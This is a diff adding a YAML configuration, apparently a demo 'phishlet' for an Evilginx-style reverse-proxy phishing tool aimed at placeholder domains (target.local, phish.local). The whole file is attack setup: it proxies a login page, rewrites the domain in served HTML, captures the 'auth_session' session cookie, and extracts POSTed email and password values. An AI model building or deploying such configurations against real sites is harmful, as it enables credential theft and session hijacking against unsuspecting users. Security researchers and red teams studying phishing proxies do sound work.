@@ -1,0 +1,38 @@
+name: target-site
+author: demo
+version: "1"
+
+proxy_hosts:
+  - phish_sub: login
+    orig_sub:  login
+    domain:    target.local
+    is_landing: true
+
+sub_filters:
+  - triggers_on: login.target.local
+    orig_sub:    login
+    domain:      target.local
+    search:      target\.local
+    replace:     phish.local
+    mime_type:   text/html
+    reverse:     false
+
+auth_tokens:
+  - domain: ".target.local"
+    keys:
+      - name: auth_session
+        required: true
+
+credentials:
+  username:
+    key:    "^email$"
+    search: "^(.+)$"
+    type:   post
+  password:
+    key:    "^password$"
+    search: "^(.+)$"
+    type:   post
+
+login:
+  domain: login.target.local
+  path:   /login
